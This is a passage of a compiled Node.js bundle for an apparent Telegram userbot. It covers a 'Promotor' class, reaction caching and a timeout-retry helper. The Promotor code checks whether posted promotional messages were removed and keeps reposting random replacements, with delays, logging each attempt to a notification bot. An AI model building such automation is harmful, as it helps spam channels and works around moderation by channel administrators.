                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${(_b = process.env.clientId) === null || _b === void 0 ? void 0 : _b.toUpperCase()}:Removed Successfully\nattempt=${attemptCount}\nR=${messageIndex}\n@${chat.username}\nhttps://t.me/${chat.username}/${sentMessageId}`)}`);
                }
                else {
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${(_c = process.env.clientId) === null || _c === void 0 ? void 0 : _c.toUpperCase()}: Already Not exist\nattempt=${attemptCount}\nR=${messageIndex}\n@${chat.username}\nhttps://t.me/${chat.username}/${sentMessageId}`)}`);
                }
                // if (chat.availableMsgs.length < 2 && randomMsgId === '0') {
                //     await db.updateActiveChannel({ channelId: chat.channelId }, { banned: true });
                //     await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId?.toUpperCase()}: Banned Channel 2\nattempt=${attemptCount}\nR=${randomMsgId}\n@${chat.username}`)}`);
                // }
            }
        });
    }
    handleExistingMessage(chat, messageIndex, sentMessageId) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a;
            const db = dbservice_1.UserDataDtoCrud.getInstance();
            yield db.updatePromoteStats(chat.username);
            if (messageIndex) {
                const result = yield db.addToAvailableMsgs({ channelId: chat.channelId }, messageIndex);
                if (result.modifiedCount) {
                    yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${(_a = process.env.clientId) === null || _a === void 0 ? void 0 : _a.toUpperCase()}: pushed Id ${messageIndex} to @${chat.username}\nhttps://t.me/${chat.username}/${sentMessageId}`)}`);
                }
            }
            else {
                yield db.addToAvailableMsgs({ channelId: chat.channelId }, "0");
            }
        });
    }
    retryMessageSending(chat_1, messageId_1, sentMessageIndex_1) {
        return __awaiter(this, arguments, void 0, function* (chat, messageId, sentMessageIndex, waitTime = 8000, isDoubtMessage = false, isDefaultMessage) {
            const availableMessages = [...chat.availableMsgs];
            const index = availableMessages.indexOf(sentMessageIndex);
            if (index !== -1) {
                availableMessages.splice(index, 1);
            }
            let sentMessageId = messageId;
            for (let attempt = 0; attempt < 4; attempt++) {
                if (sentMessageId && !chat.banned) {
                    const nextMessageIndex = (0, utils_1.selectRandomElements)(availableMessages, 1)[0];
                    const index = availableMessages.indexOf(nextMessageIndex);
                    if (index !== -1) {
                        availableMessages.splice(index, 1);
                    }
                    yield (0, Helpers_1.sleep)(waitTime + 25000);
                    sentMessageId = yield this.checkAndResendMessage(chat, sentMessageId, nextMessageIndex, sentMessageIndex, attempt, 0, isDoubtMessage);
                    if (sentMessageId) {
                        sentMessageIndex = nextMessageIndex ? nextMessageIndex : "0";
                    }
                }
                else {
                    break;
                }
            }
        });
    }
    getCurrentHourIST() {
        const now = new Date();
        const istOffset = 5.5 * 60 * 60 * 1000;
        const istTime = new Date(now.getTime() + istOffset);
        const istHour = istTime.getUTCHours();
        return istHour;
    }
    broadcast(name, msg) {
        return __awaiter(this, void 0, void 0, function* () {
            const now = new Date().toLocaleString('en-IN').split(',')[1];
            console.log(`${now}||${name} : ${msg}`);
        });
    }
}
exports.Promotor = Promotor;


/***/ }),

/***/ "./src/utils/reaction.utils.ts":
/*!*************************************!*\
  !*** ./src/utils/reaction.utils.ts ***!
  \*************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getAReaction = getAReaction;
exports.getAllReactions = getAllReactions;
exports.setReactions = setReactions;
exports.hasReactions = hasReactions;
exports.saveReactionsToFile = saveReactionsToFile;
exports.loadReactionsFromFile = loadReactionsFromFile;
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const path = __importStar(__webpack_require__(/*! path */ "path"));
const chatReactionsCache = new Map();
const CLIENT_ID = process.env.CLIENT_ID || 'default';
const REACTIONS_DIR = './data/reactions';
const getReactionsFilePath = () => path.join(REACTIONS_DIR, `reactions_${CLIENT_ID}.json`);
function getAReaction(chatId) {
    var _a;
    const availableReactions = chatReactionsCache.get(chatId);
    if (availableReactions && availableReactions.length > 0) {
        const reactionIndex = Math.floor(Math.random() * availableReactions.length);
        return (_a = availableReactions[reactionIndex]) === null || _a === void 0 ? void 0 : _a.emoticon;
    }
    else {
        return '👍';
    }
}
function getAllReactions(chatId) {
    return chatReactionsCache.get(chatId);
}
function setReactions(chatId, reactions) {
    chatReactionsCache.set(chatId, reactions);
}
function hasReactions(chatId) {
    return chatReactionsCache.has(chatId);
}
function saveReactionsToFile() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            yield fs.promises.mkdir(REACTIONS_DIR, { recursive: true });
            const filePath = getReactionsFilePath();
            const cacheObject = {};
            for (const [chatId, reactions] of chatReactionsCache.entries()) {
                const emoticons = reactions.map(reaction => reaction === null || reaction === void 0 ? void 0 : reaction.emoticon);
                cacheObject[chatId] = emoticons;
            }
            fs.writeFileSync(filePath, JSON.stringify(cacheObject, null, 2), "utf-8");
            console.log(`Reactions saved to file: ${filePath}`);
        }
        catch (error) {
            console.error("Error saving reactions to file:", error);
        }
    });
}
function loadReactionsFromFile() {
    return __awaiter(this, void 0, void 0, function* () {
        const filePath = getReactionsFilePath();
        if (fs.existsSync(filePath)) {
            const data = fs.readFileSync(filePath, "utf-8");
            const cacheObject = JSON.parse(data);
            for (const [chatId, emoticons] of Object.entries(cacheObject)) {
                const reactions = emoticons.map(emoticon => new telegram_1.Api.ReactionEmoji({ emoticon }));
                chatReactionsCache.set(chatId, reactions);
            }
            console.log(`Reactions loaded from file: ${filePath}`);
        }
        else {
            console.log(`No existing reactions file found at: ${filePath}`);
        }
    });
}


/***/ }),

/***/ "./src/utils/withTimeout.ts":
/*!**********************************!*\
  !*** ./src/utils/withTimeout.ts ***!
  \**********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.withTimeout = withTimeout;
exports.promiseRace = promiseRace;
const async_mutex_1 = __webpack_require__(/*! async-mutex */ "async-mutex");
const index_1 = __webpack_require__(/*! ../index */ "./src/index.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
const semaphore = new async_mutex_1.Semaphore(10); // Allow up to 10 concurrent calls
function withTimeout(promise_1) {
    return __awaiter(this, arguments, void 0, function* (promise, timeout = 8000, errorMessage = "Tg Timeout", throwErr = true, maxRetries = 3) {
        const callStack = new Error().stack; // Capture stack trace for debugging
        return semaphore.runExclusive(() => __awaiter(this, void 0, void 0, function* () {
            let attempt = 1;
            let lastError;
            while (attempt <= maxRetries) {
                try {
                    if (attempt > 1) {
                        yield (0, Helpers_1.sleep)(attempt * 300);
                        yield index_1.tgClass.connect();
                        console.log("Attempt:", attempt);
                    }
                    const result = yield promiseRace(promise, timeout, errorMessage);
                    if (attempt > 1) {
                        console.log("Promise successful on Attempt:", attempt);
                    }
                    return result;
                }
                catch (error) {
                    lastError = { message: error.message, stack: error.stack };
                    console.log(`Attempt ${attempt} failed:`, lastError);
                    if (error.message.includes(errorMessage)) {
                        if (attempt === maxRetries) {
                            console.error("Timeout occurred. Root cause unknown.", lastError);
                            if (throwErr) {
                                yield index_1.tgClass.getClient().connect();
                                yield (0, Helpers_1.sleep)(1000);
                                throw { message: error.message, stack: callStack };
                            }
                            else {
                                return undefined;
                            }
                        }
                        attempt++;
                    }
                    else {
                        (0, parseError_1.parseError)({ message: error.message, stack: error.stack }, "With Timeout");
                        if (throwErr) {
                            throw { message: error.message, stack: callStack };
                        }
                        else {
                            return undefined;
                        }
                    }
                }
            }
            throw { message: "Unexpected behavior in retry mechanism", stack: callStack };
        }));
    });
}
function promiseRace(promise, timeout, errorMessage) {
    return __awaiter(this, void 0, void 0, function* () {
        return yield Promise.race([
            promise.catch(err => {
                throw { message: `Promise failed before timeout: ${err.message}`, stack: err.stack };
            }),
            new Promise((_, reject) => {
                setTimeout(() => {
                    reject({ message: `${errorMessage} (Promise Timeout)`, stack: new Error().stack });
                }, timeout);
            }),
        ]);
    });
}


/***/ }),

/***/ "@google/generative-ai":
/*!****************************************!*\
  !*** external "@google/generative-ai" ***!
  \****************************************/
/***/ ((module) => {

module.exports = require("@google/generative-ai");

/***/ }),

/***/ "adm-zip":
/*!**************************!*\
  !*** external "adm-zip" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("adm-zip");

/***/ }),

/***/ "async-mutex":
/*!******************************!*\
  !*** external "async-mutex" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("async-mutex");

/***/ }),

/***/ "axios":
/*!************************!*\
  !*** external "axios" ***!
  \************************/
/***/ ((module) => {

module.exports = require("axios");

/***/ }),

/***/ "big-integer":
/*!******************************!*\
  !*** external "big-integer" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("big-integer");

/***/ }),

/***/ "cloudinary":
/*!*****************************!*\
  !*** external "cloudinary" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("cloudinary");

/***/ }),

/***/ "cors":
/*!***********************!*\
  !*** external "cors" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("cors");

/***/ }),

/***/ "dotenv":
/*!*************************!*\
  !*** external "dotenv" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("dotenv");

/***/ }),

/***/ "express":
/*!**************************!*\
  !*** external "express" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("express");

/***/ }),

/***/ "form-data":
/*!****************************!*\
  !*** external "form-data" ***!
  \****************************/
/***/ ((module) => {

module.exports = require("form-data");

/***/ }),

/***/ "mongodb":
/*!**************************!*\
  !*** external "mongodb" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("mongodb");

/***/ }),

/***/ "node-fetch":
/*!*****************************!*\
  !*** external "node-fetch" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("node-fetch");

/***/ }),

/***/ "node-schedule":
/*!********************************!*\
  !*** external "node-schedule" ***!
  \********************************/
/***/ ((module) => {

module.exports = require("node-schedule");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("path");

/***/ }),

/***/ "qrcode":
/*!*************************!*\
  !*** external "qrcode" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("qrcode");

/***/ }),

/***/ "telegram":
/*!***************************!*\
  !*** external "telegram" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("telegram");

/***/ }),

/***/ "telegram/Helpers":
/*!***********************************!*\
  !*** external "telegram/Helpers" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("telegram/Helpers");

/***/ }),

/***/ "telegram/client/messageParse":
/*!***********************************************!*\
  !*** external "telegram/client/messageParse" ***!
  \***********************************************/
/***/ ((module) => {

module.exports = require("telegram/client/messageParse");

/***/ }),

/***/ "telegram/client/uploads":
/*!******************************************!*\
  !*** external "telegram/client/uploads" ***!
  \******************************************/
/***/ ((module) => {

module.exports = require("telegram/client/uploads");

/***/ }),

/***/ "telegram/client/users":
/*!****************************************!*\
  !*** external "telegram/client/users" ***!
  \****************************************/
/***/ ((module) => {

module.exports = require("telegram/client/users");

/***/ }),

/***/ "telegram/crypto/AuthKey":
/*!******************************************!*\
  !*** external "telegram/crypto/AuthKey" ***!
  \******************************************/
/***/ ((module) => {

module.exports = require("telegram/crypto/AuthKey");

/***/ }),

/***/ "telegram/errors":
/*!**********************************!*\
  !*** external "telegram/errors" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("telegram/errors");

/***/ }),

/***/ "telegram/events":
/*!**********************************!*\
  !*** external "telegram/events" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("telegram/events");

/***/ }),

/***/ "telegram/extensions/Logger":
/*!*********************************************!*\
  !*** external "telegram/extensions/Logger" ***!
  \*********************************************/
/***/ ((module) => {

module.exports = require("telegram/extensions/Logger");

/***/ }),

/***/ "telegram/network/MTProtoState":
/*!************************************************!*\
  !*** external "telegram/network/MTProtoState" ***!
  \************************************************/
/***/ ((module) => {

module.exports = require("telegram/network/MTProtoState");

/***/ }),

/***/ "telegram/sessions":
/*!************************************!*\
  !*** external "telegram/sessions" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/sessions");

/***/ }),

/***/ "child_process":
/*!********************************!*\
  !*** external "child_process" ***!
  \********************************/
/***/ ((module) => {

module.exports = require("child_process");

/***/ }),

/***/ "fs":
/*!*********************!*\
  !*** external "fs" ***!
  \*********************/
/***/ ((module) => {

module.exports = require("fs");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module is referenced by other modules so it can't be inlined
/******/ 	var __webpack_exports__ = __webpack_require__("./src/entry.ts");
/******/ 	var __webpack_export_target__ = exports;
/******/ 	for(var i in __webpack_exports__) __webpack_export_target__[i] = __webpack_exports__[i];
/******/ 	if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
/******/ 	
/******/ })()
;
//# sourceMappingURL=index.js.map